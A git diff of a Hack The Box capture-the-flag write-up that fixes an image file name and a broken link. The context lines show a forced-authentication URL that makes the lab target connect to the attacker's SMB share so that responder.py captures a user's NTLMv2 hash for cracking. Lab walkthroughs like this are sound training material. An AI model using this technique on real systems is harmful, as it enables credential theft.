@@ -26,7 +26,7 @@ The CTF was active from 26 Sep, 2020 17:00 until 27 Sep, 2020 05:00.
 First Step: HTB{L3t_The_G4mes_Beg!n}
 ```
 
-![](writeupfiles/Untitled 08.png)
+![](writeupfiles/Untitled008.png)
 
 # Saturn - User
 
@@ -131,7 +131,7 @@ Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corpo
 [*] Remaining connections []
 ```
 
-After discovering that a reverse shell or web shell was also not possible, `responder.py` was used to obtain the NTLMv2 password hash of the Plagcheck user. This was done by using the above `[smbserver.py](http://smbserver.py)` command and navigating to `https://10.10.10.93/index.php?url=smb://10.10.14.61/share/test.txt`.
+After discovering that a reverse shell or web shell was also not possible, `responder.py` was used to obtain the NTLMv2 password hash of the Plagcheck user. This was done by using the above `smbserver.py` command and navigating to `https://10.10.10.93/index.php?url=smb://10.10.14.61/share/test.txt`.
 
 The hash was then cracked using the below command
 
